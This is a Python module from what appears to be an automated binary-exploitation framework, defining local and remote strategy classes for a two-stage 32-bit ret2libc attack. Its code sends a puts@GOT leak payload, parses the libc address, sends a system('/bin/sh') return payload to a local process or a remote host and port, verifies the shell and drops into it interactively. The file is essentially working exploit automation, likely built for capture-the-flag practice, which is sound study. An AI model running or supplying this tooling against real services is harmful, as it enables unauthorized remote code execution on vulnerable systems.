"""P7.4: x32 ret2libc-put strategies (local + remote).

Replaces the v3.1 monolith's ``ret2libc_put_x32`` (L1706-1772, local)
+ ``ret2libc_put_x32_remote`` (L1975-2042, remote) ad-hoc 2-stage
functions with two :class:`ExploitStrategy` subclasses.

The 2-stage flow
----------------
Unlike P7.3's single-payload ret2system, ret2libc-put needs
**two** payload exchanges because the ``system`` address lives
in libc (which is at an ASLR-randomized address).  The flow is:

  1. **Stage 1 (leak)**: send ``padding + puts_plt + main + puts_got``.
     The binary's ``main()`` calls ``puts(puts_got)`` which prints
     the runtime address of libc's ``puts``.  Return to ``main()``
     so the binary can receive the stage-2 payload.
  2. **Parse leak**: ``u32(io.recv(4))`` (x32) or
     ``u64(io.recvuntil(b'\\x7f')[-6:].ljust(8, b'\\x00'))`` (x64).
  3. **Stage 2 (return-to-system)**: send
     ``padding + system_addr + 0 + sh_addr``.  Primitive calculates
     ``system`` + ``/bin/sh`` addresses from the leak.
  4. **Shell**: ``io.interactive()``.

The P6.3 primitive (already implemented) provides
``build_payload(ctx)`` (stage 1) and
``build_stage2_payload(ctx, leaked_puts_addr)`` (stage 2).  The
strategy wires them together with the IO loop.

Per ``rebuild.md`` §6.8 P7.4 + §4.8 spec +
``refactor.md`` §3.2.2 + P6.3 primitive contract.
"""
from __future__ import annotations

import datetime

from autopwn.context import ExploitContext
from autopwn.core.logging import print_info, print_payload, print_section_header, print_success, print_warning
from autopwn.exp.base import ExploitStrategy
from autopwn.exp.priorities import RET2LIBC_PUT
from autopwn.exp.registry import register
from autopwn.primitives.ret2libc_put import Ret2LibcPutX32
from autopwn.report.model import ExploitInfo
from autopwn.core.shell_verify import verify_shell


# ---------------------------------------------------------------------------
# Local x32 strategy
# ---------------------------------------------------------------------------


@register
class Ret2LibcPutX32LocalStrategy(ExploitStrategy):
    """Local 32-bit 2-stage ret2libc via ``puts(puts@GOT)`` leak.

    Metadata (``requires_*``):
      * ``arch = 32``
      * ``remote = False``
      * ``requires = ("has_puts",)`` — needs ``puts`` in PLT
        (populated by P4.3 ``plt.scan``).  System and ``/bin/sh``
        are in libc, not the binary, so they don't gate this
        strategy; the libc resolution happens at stage-2 time
        (P6.3 ``_resolve_libc_elf`` reads ``ctx.libc``).

    Priority ``RET2LIBC_PUT = 120`` per 附录 A.  Tried after
    ret2system (150) — which doesn't need a leak stage — but
    before ret2libc_write (110) and rwx (90).  PUT PLT is
    more universally available than WRITE PLT in glibc, so
    PUT is preferred over WRITE (per 附录 A 备注: P7.2a
    Owner decision).

    Leak-parsing contract
    ---------------------
    v3.1 used ``io.recvuntil(b'\\xf7')[-4:]`` to find the
    leaked address (the high byte 0xf7 is a tell-tale sign of
    a libc address in 32-bit Linux userspace).  We keep the
    same pattern for the local strategy.  Remote uses
    ``io.recv(4)`` instead because the recv timeout is
    tighter and a known-size read is safer.

    Returns:
        ``True`` on successful shell, ``False`` on leak
        parse failure or primitive empty (skip to next candidate).
    """

    name = "ret2libc-put-x32"
    priority = RET2LIBC_PUT
    requires_arch = 32
    requires_remote = False
    requires = ("has_puts",)

    def run(self, ctx: ExploitContext) -> bool:
        """Execute the 32-bit 2-stage ret2libc locally."""
        from pwn import process, u32

        print_section_header("EXPLOITATION: ret2libc (puts) - x32")
        print_payload("preparing ret2libc exploit using puts function")

        primitive = Ret2LibcPutX32()

        # Stage 1: leak.
        payload1 = primitive.build_payload(ctx)
        if not payload1:
            print_info("ret2libc-put-x32 stage1 primitive returned empty; skipping")
            return False

        io = process(str(ctx.binary.path))
        # v4.0.2c1: ``io.recv()`` with no count blocks until EOF,
        # but the target binary may not print a prompt first (e.g.
        # fmtstr1 immediately reads input).  Cap the wait at 0.5s
        # and discard the (possibly empty) initial banner.
        try:
            io.recv(timeout=0.5)
        except Exception:
            pass
        io.sendline(payload1)
        print_payload("sending puts leak payload")

        # Parse the leak: 4 bytes ending in 0xf7.
        # v4.0.2c1: add timeout=2 to prevent indefinite hang when
        # binary doesn't produce the expected leak (e.g. fmtstr1 has
        # canary protection + no stack overflow → puts leak never
        # arrives → recvuntil blocks forever).
        try:
            puts_addr = u32(io.recvuntil(b"\xf7", timeout=2)[-4:])
        except Exception as e:
            print_info(f"ret2libc-put-x32 leak parse failed: {e}")
            return False
        print_success(f"puts address leaked: {hex(puts_addr)}")

        # Stage 2: return-to-system.
        payload2 = primitive.build_stage2_payload(ctx, puts_addr)
        if not payload2:
            print_info("ret2libc-put-x32 stage2 primitive returned empty; skipping")
            return False

        io.sendline(payload2)

        # Build ExploitInfo.
        info = ExploitInfo(
            exploit_type="ret2libc (puts) - x32",
            payload=payload2,
            padding=ctx.padding,
            addresses={
                "puts_addr": puts_addr,
            },
            vulnerability_type="Stack Buffer Overflow",
            architecture="x32",
            target_binary=ctx.binary.path.name,
            timestamp=datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S"),
        )


        verify_ok, verify_output = verify_shell(io, keep_alive=True)
        from autopwn.core.shell_verify import record_success_verified
        ok = record_success_verified(info, verify_ok, verify_output, ctx)
        if not ok:
            print_warning(f"Ret2LibcPutX32LocalStrategy: shell verification failed (no PWNED in shell output)")
            return False
        ctx.id_output = verify_output
        io.interactive()  # v4.0.4: drop user into shell; returns when user exits
        return True


# ---------------------------------------------------------------------------
# Remote x32 strategy
# ---------------------------------------------------------------------------


@register
class Ret2LibcPutX32RemoteStrategy(ExploitStrategy):
    """Remote 32-bit 2-stage ret2libc via ``puts(puts@GOT)`` leak.

    Mirror of :class:`Ret2LibcPutX32LocalStrategy` for the
    ``ctx.mode == "remote"`` branch.  Same 2-stage flow;
    ``pwn.remote(host, port)`` instead of ``pwn.process(path)``.

    Remote uses ``io.recv(4)`` for the leak (size-known read)
    instead of the local ``recvuntil(b'\\xf7')`` heuristic —
    network jitter makes the recvuntil timeout-flaky, and a
    fixed-size 4-byte read is the safe choice.
    """

    name = "ret2libc-put-x32-remote"
    priority = RET2LIBC_PUT
    requires_arch = 32
    requires_remote = True
    requires = ("has_puts",)

    def run(self, ctx: ExploitContext) -> bool:
        """Execute the 32-bit 2-stage ret2libc against a remote service."""
        from pwn import remote, u32

        if ctx.remote is None:
            print_info("ret2libc-put-x32-remote: ctx.remote is None; skipping")
            return False
        host, port = ctx.remote

        print_section_header("EXPLOITATION: ret2libc (puts) - x32 Remote")
        print_payload("preparing remote ret2libc exploit using puts function")

        primitive = Ret2LibcPutX32()

        payload1 = primitive.build_payload(ctx)
        if not payload1:
            print_info("ret2libc-put-x32-remote stage1 primitive returned empty; skipping")
            return False

        io = remote(host, port, ssl=ctx.ssl)  # v4.1.11
        io.recv()
        io.sendline(payload1)
        print_payload("sending puts leak payload")

        try:
            puts_addr = u32(io.recv(4))
        except Exception as e:
            print_info(f"ret2libc-put-x32-remote leak parse failed: {e}")
            return False
        print_success(f"puts address leaked: {hex(puts_addr)}")

        payload2 = primitive.build_stage2_payload(ctx, puts_addr)
        if not payload2:
            return False

        io.sendline(payload2)

        info = ExploitInfo(
            exploit_type="ret2libc (puts) - x32 Remote",
            payload=payload2,
            padding=ctx.padding,
            addresses={
                "puts_addr": puts_addr,
            },
            vulnerability_type="Stack Buffer Overflow",
            architecture="x32",
            target_binary=ctx.binary.path.name,
            timestamp=datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S"),
        )


        verify_ok, verify_output = verify_shell(io, keep_alive=True)
        from autopwn.core.shell_verify import record_success_verified
        ok = record_success_verified(info, verify_ok, verify_output, ctx)
        if not ok:
            print_warning(f"Ret2LibcPutX32LocalStrategy: shell verification failed (no PWNED in shell output)")
            return False
        ctx.id_output = verify_output
        io.interactive()  # v4.0.4: drop user into shell; returns when user exits
        return True


__all__ = [
    "Ret2LibcPutX32LocalStrategy",
    "Ret2LibcPutX32RemoteStrategy",
]
